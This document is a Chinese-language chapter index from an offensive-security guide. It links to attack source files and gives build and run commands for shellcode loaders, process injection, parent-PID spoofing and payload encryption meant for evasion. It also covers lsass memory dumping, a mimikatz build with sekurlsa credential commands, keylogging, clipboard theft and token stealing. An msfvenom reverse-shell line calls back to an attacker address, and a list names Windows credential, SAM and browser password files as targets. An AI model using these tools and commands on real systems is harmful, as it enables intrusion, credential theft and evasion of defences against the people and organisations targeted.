## 加载器

### 下载远程恶意文件

[wolf.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/wolf.cpp)

```bash
x86_64-w64-mingw32-g++ -shared -o wolf.dll wolf.cpp -fpermissive
```

[download.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/download.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 download.cpp -o download.exe -mconsole -lwininet -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```bash
.\download.exe 进程PID
```

### Shellcode加载

1. EnumDesktopsA函数

```bash
msfvenom -p windows/x64/messagebox TEXT="Hello, World" -f c
```

[enumdesktopa.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/enumdesktopa.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 enumdesktopa.cpp -o enumdesktopa.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
````

2. EnumChildWindows函数

[ecw.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/ecw.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 ecw.cpp -o ecw.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

3. Listplanting函数

[llcalc.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/llcalc.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 llcalc.cpp -o llcalc.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

4. EnumerateLoadedModules函数

[elm.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/elm.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 elm.cpp -o elm.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -ldbghelp
```

## 系统调用

[sycall.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/sycall.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 sycall.cpp -o sycall.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

## 枚举进程并注入

### 单独枚举进程

[枚举进程.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9E%9A%E4%B8%BE%E8%BF%9B%E7%A8%8B%E5%B9%B6%E6%B3%A8%E5%85%A5/枚举进程.cpp)


### NtGetNextProcess函数

[ngnp.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9E%9A%E4%B8%BE%E8%BF%9B%E7%A8%8B%E5%B9%B6%E6%B3%A8%E5%85%A5/ngnp.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 ngnp.cpp -o ngnp.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lpsapi -lshlwap
```

### WTSEnumerateProcesses函数

[wtsep.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9E%9A%E4%B8%BE%E8%BF%9B%E7%A8%8B%E5%B9%B6%E6%B3%A8%E5%85%A5/wtsep.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 wtsep.cpp -o wtsep.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lpsapi -lshlwap
```

## 父进程PID欺骗

### explorer进程

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击者IP地址 LPORT=4444 -f c
```

[exp.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E7%88%B6%E8%BF%9B%E7%A8%8BPID%E6%AC%BA%E9%AA%97/exp.cpp)

### 自定义父进程

[custom.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E7%88%B6%E8%BF%9B%E7%A8%8BPID%E6%AC%BA%E9%AA%97/custom.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 custom.cpp -o custom.exe -mwindows -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

## 互斥锁

[mutex.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BA%92%E6%96%A5%E9%94%81/mutex.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 mutex.cpp -o mutex.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

## 代码混淆和加密

### 混淆技术

1. 重命名

[script.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/script.py)

```bash
python script.py example.txt old new
```

2. 控制流混淆

(1)条件控制流混淆

[number.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/number.py)

[tj.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/tj.py)

(2)控制流平坦化

[cff.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/cff.py)

```bash
pip install astor
```

[flatten.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/flatten.py)

```bash
python flatten.py cff.py
```

(3)不透明谓词

[example.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/example.py)

[op.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/op.py)

### 加密技术

1. XOR加密

```bash
msfvenom -p windows/x64/messagebox TEXT='Hi,I am Snowwolf' TITLE='Ghost Wolf Lab' -f raw -o evil.bin
```

[xor_encode.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/xor_encode.py)

[xor.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/xor.cpp)

```bash
x86_64-w64-mingw32-gcc xor.cpp -o xor.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc >/dev/null 2>&1
```

2. Z85加密

```bash
msfvenom -p windows/x64/messagebox TEXT='Hi,I am Snowwolf' TITLE='Ghost Wolf Lab' -f c
```

[z85_encode.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/z85_encode.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 z85_encode.cpp -o z85_encode.exe -I/usr/share/mingw-w64/include/ -I/usr/include/z85/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

[z85.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/z85.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 z85.cpp -o z85.exe -I/usr/share/mingw-w64/include/ -I/usr/include/z85/ -L/usr/x86_64-w64-mingw32/lib/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

3. RC5加密

[rc5.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/rc5.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 rc5.cpp -o rc5.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

4. RC6加密

[rc6.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/rc6.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 rc6.cpp -o rc6.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

5. DES加密

[des.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/des.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 des.cpp -o des.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

6. TEA加密

[tea.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/tea.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 tea.cpp -o tea.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

7. XTEA加密

[xtea.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/xtea.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 xtea.cpp -o xtea.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

8. Madryga加密

[madryga.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/madryga.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 madryga.cpp -o madryga.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

9. A5/1算法

[a5.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/a5.cpp)

```bash
86_64-w64-mingw32-gcc -O2 a5.cpp -o a5.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

10. Skipjack加密

[skipjack.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/skipjack.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 skipjack.cpp -o skipjack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

11. WAKE加密

[wake.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/wake.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 wake.cpp -o wake.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

12. SAFER加密

[safer.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/safer.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 safer.cpp -o safer.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

13. LOKI加密

[loki.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/loki.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 loki.cpp -o loki.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

14. Khufu加密

[khufu.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/khufu.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 khufu.cpp -o khufu.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

15. CAST-128加密

[cast.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/cast.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 cast.cpp -o cast.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

16. FEAL-8加密

[feal.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/feal.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 feal.cpp -o feal.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

17. 模乘运算加密

[mc_encode.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/mc_encode.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 mc_encode.cpp -o mc_encode.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

[mc_encode.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/mc_encode.py)

[mc.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/mc.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 mc.cpp -o mc.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

## 横向移动

### 侦察

#### 网络扫描

1. 获取网络适配器信息

[GetAdaptersInfo.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/GetAdaptersInfo.cpp)

2. 枚举网络资源

[WNetEnumResourceA](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/WNetEnumResourceA.cpp)

3. 枚举子网存活主机

[枚举子网存活主机](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举子网存活主机.cpp)

```bash
cl /EHsc /D WIN32 /D _CONSOLE /D _UNICODE /D UNICODE .cpp文件 /link ws2_32.lib iphlpapi.lib
```

4. 开放端口扫描

[开放端口扫描](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/开放端口扫描.cpp)

```bash
cl /EHsc /D WIN32 /D _CONSOLE /D _UNICODE /D UNICODE .cpp文件 /link ws2_32.lib iphlpapi.lib
.\.exe可执行程序 IP地址 1 100 20
```

#### 服务枚举

1. 枚举网络类型的提供程序名称

[枚举网络类型的提供程序名称](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举网络类型的提供程序名称.cpp)

2. 枚举服务

[枚举服务](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举服务.cpp)

```bash
cl /EHsc /D WIN32 /D _CONSOLE /D _UNICODE /D UNICODE .cpp文件 /link ws2_32.lib iphlpapi.lib
.\.exe可执行程序 IP地址 1 100 20
```

#### 流量分析

[监听流量](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/监听流量.cpp)

```bash
cl /EHsc /D WIN32 /D _CONSOLE /D _UNICODE /D UNICODE .cpp文件 /link ws2_32.lib iphlpapi.lib
.\.exe可执行程序 监听协议 IP地址 80
```

#### 枚举进程

[枚举进程](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举进程.cpp)

```bash
cl /EHsc /D WIN32 /D _CONSOLE /D _UNICODE /D UNICODE .cpp文件 /link ws2_32.lib iphlpapi.lib
.\可执行程序 进程名称
```

#### 枚举文件

+	用户凭证：存储在C:\Users\<username>\AppData\Local\Microsoft\Credentials和C:\Users\<username>\AppData\Roaming\Microsoft\Credentials中的文件。
+	浏览器密码：存储在浏览器配置文件中的密码，如Google Chrome的Login Data文件。
+	系统配置文件：如C:\Windows\System32\config\SAM（安全帐户管理数据库）和C:\Windows\System32\config\SYSTEM（系统配置）。
+	应用程序配置文件：如IIS的配置文件C:\Windows\System32\inetsrv\config\applicationHost.config。
+	启动脚本：存储在C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup和C:\Windows\System32\GroupPolicy\User\Scripts\Logon中的脚本。
+	任务计划脚本：存储在C:\Windows\System32\Tasks中的任务计划脚本。
+	日志文件：如C:\Windows\System32\winevt\Logs中的事件日志文件。
+	注册表项：如HKEY_LOCAL_MACHINE\SYSTEM和HKEY_LOCAL_MACHINE\SOFTWARE中的注册表项，包含系统和应用程序的配置信息。

[枚举文件](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举文件.cpp)

```bash
.\exe可执行程序 文件名 D:\
```

#### 注册表枚举

+	系统启动项：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run和HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run。
+	网络配置：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters。
+	用户账户信息：HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users。
+	用户最近使用的文件：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs。
+	已安装的软件列表：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall和HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall
+	应用程序设置：HKEY_CURRENT_USER\Software（包含用户安装的应用程序的配置信息）。
+	浏览器历史记录和缓存：HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs和HKEY_CURRENT_USER\Software\Google\Chrome\PreferenceMACs。
+	远程桌面连接信息：HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default。

[注册表枚举](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/注册表枚举.cpp)

```bash
.\可执行程序.exe HKEY_LOCAL_MACHINE SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
```

#### 枚举系统信息

[枚举系统信息](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举系统信息.cpp)

[枚举系统设备驱动程序](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举系统设备驱动程序.cpp)

[枚举磁盘卷空间信息](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举磁盘卷空间信息.cpp)

### 凭证收集

1. 内存抓取

[抓取lsass.exe内存数据](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/抓取lsass.exe内存数据.cpp)

[解码内容](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/解码内容.py)

[指定进程内存抓取](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/指定进程内存抓取.cpp)

[mimikatz](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/mimikatz.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 mimikatz.cpp -o mimikatz.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -ldbghelp
```

```bash
.\mimikatz.exe
sekurlsa::minidump c:\temp\lsass.dmp
sekurlsa::logonpasswords
```

2. 键盘记录

[键盘记录](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/键盘记录.cpp)

3. 剪切板窃取

[剪切板窃取](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/剪切板窃取.cpp)

4. 网络嗅探

[枚举主机系统的Internet缓存](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举主机系统的Internet缓存.cpp)


### 令牌窃取

1. 复制令牌

[dup_token.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/dup_token.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 dup_token.cpp -o dup_token.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```bash
Get-Process winlogon
dup_token.exe PID
```

2. 继承令牌

[i_token.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/i_token.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 i_token.cpp -o i_token.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```bash
Get-Process winlogon
i_token.exe PID
```

### 远程执行

